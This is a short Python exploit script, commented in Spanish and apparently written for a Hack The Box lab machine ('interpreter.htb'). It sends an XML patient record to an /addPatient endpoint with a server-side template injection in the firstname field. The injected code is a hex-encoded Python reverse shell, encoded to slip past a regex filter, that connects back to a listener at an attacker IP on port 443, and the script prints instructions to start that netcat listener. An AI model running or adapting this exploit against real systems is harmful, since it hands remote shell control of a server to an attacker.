import urllib.request

# CONFIGURACIÓN
KALI_IP = "10.10.14.209"
KALI_PORT = "443" # Cambiado a 443 por ser más estable
TARGET_URL = "http://interpreter.htb:6661/addPatient"

# Payload de Reverse Shell más compatible (usa /bin/sh si bash falla)
rev_shell = f"""
import socket,os,subprocess
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{KALI_IP}",{KALI_PORT}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
""".strip()

# Bypass de Regex mediante Hex Encoding
hex_payload = rev_shell.encode().hex()

# Estructura SSTI basada en el Root Cause del Readme
xml_data = f"""<patient>
    <firstname>{{exec(bytes.fromhex("{hex_payload}").decode())}}</firstname>
    <lastname>pwn</lastname>
    <sender_app>pwn</sender_app>
    <timestamp>pwn</timestamp>
    <birth_date>01/01/2000</birth_date>
    <gender>pwn</gender>
</patient>""".strip()

print(f"[*] Intentando RCE en {TARGET_URL}...")
print(f"[*] Tu Listener debe estar en: sudo nc -lvnp {KALI_PORT}")

req = urllib.request.Request(
    TARGET_URL, 
    data=xml_data.encode(), 
    headers={
        "Content-Type": "application/xml",
        "Host": "interpreter.htb"
    }
)

try:
    # Si la shell conecta, este comando se quedará esperando (timeout)
    urllib.request.urlopen(req, timeout=10)
except Exception as e:
    print(f"[!] Petición finalizada. Verifica tu nc.")
